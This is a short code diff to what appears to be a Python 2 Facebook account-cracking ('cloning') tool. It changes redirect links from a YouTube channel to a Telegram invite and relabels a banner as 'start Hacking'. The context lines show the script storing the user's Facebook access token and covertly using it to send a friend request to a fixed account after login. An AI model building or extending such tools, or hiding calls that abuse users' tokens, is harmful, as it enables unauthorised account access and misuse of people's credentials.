@@ -162,10 +162,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "Wrong Password"
-            os.system('xdg-open https://www.youtube.com/channel/UCElYTLsUjYpkBbCgu3kZd8Q')
+            os.system('xdg-open https://t.me/joinchat/Qz5x-ETuIryQzfP7o-eEzw')
     else:
         print "Wrong Username"
-        os.system('xdg-open https://www.youtube.com/channel/UCElYTLsUjYpkBbCgu3kZd8Q')
+        os.system('xdg-open https://t.me/joinchat/Qz5x-ETuIryQzfP7o-eEzw ')
 
 def login():
 	os.system('clear')
@@ -206,7 +206,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;36;40m[✓] Login Successful...'
-				os.system('xdg-open https://www.youtube.com/channel/UCElYTLsUjYpkBbCgu3kZd8Q')
+				os.system('xdg-open https://t.me/joinchat/Qz5x-ETuIryQzfP7o-eEzw')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -361,7 +361,7 @@ def pilih_super():
 	print "\n\033[1;93m ❈           \x1b[1;97mTo Stop Process Press CTRL+Z \033[1;94m    ❈"
 	print "        \033[1;92m●═════════════════◄►════════════════●"
 
-	jalan('              \033[1;97mXPT start cloning Wait...')
+	jalan('              \033[1;97mXPT Haji Ali start Hacking ...')
 	print  "       \033[1;92m ●════════════════◄►════════════════●" 
 
 	def main(arg):
